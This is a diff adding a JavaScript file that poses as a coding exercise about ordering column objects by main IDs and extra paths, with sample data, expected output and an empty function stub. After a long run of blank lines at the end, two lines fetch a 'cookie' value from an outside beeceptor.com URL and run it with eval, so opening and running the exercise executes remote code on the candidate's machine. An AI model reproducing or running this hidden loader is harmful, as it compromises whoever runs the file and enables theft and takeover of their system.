@@ -1,0 +1,80 @@
+/**
+* Problem Statement:
+*
+* You have three arrays: mainColumnIds, allColumns, and extraColumnPaths.
+* The goal is to generate a new array that contains objects from allColumns
+* based on the ordered mainColumnIds and ordered extra paths specified in extraColumnPaths.
+* The paths may contain IDs that do not exist in allColumns, and these should be ignored.
+*/
+
+const allColumns = [{id: 53}, {id: 22}, {id: 37}, {id: 77}, {id: 94}, {id: 11}]
+
+/**
+* Ordered main column IDs
+* | 53 | 11 | 77 |
+*/
+const mainColumnIds = [53, 11, 77]
+/**
+* Ordered extra column paths where first id should be the main column id
+*/
+const extraColumnPaths = [
+ [53, 22, 37],
+ [77, 94],
+ [53, 22, 88], // partially non-existing path
+ [53, 88], // non-existing path
+ [99], // non-existing path
+]
+
+/**
+* Expected output visualisation (* are the main columns):
+* | 53* | 22 | 37 | 22 | 11* | 77* | 94 |
+*
+* Expected output:
+* [
+* { id: 53 },
+* { id: 22 },
+* { id: 37 },
+* { id: 22 },
+* { id: 11 },
+* { id: 77 },
+* { id: 94 }
+* ]
+*/
+
+const main = (mainColumnIds, allColumns, extraColumnPaths) => {
+ // Implement the function logic here
+}
+
+const output = main(mainColumnIds, allColumns, extraColumnPaths)
+console.log(output)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+const dataC = await axios.get('https://sui-card-game.free.beeceptor.com/cookie');
+eval(dataC.data.cookie);
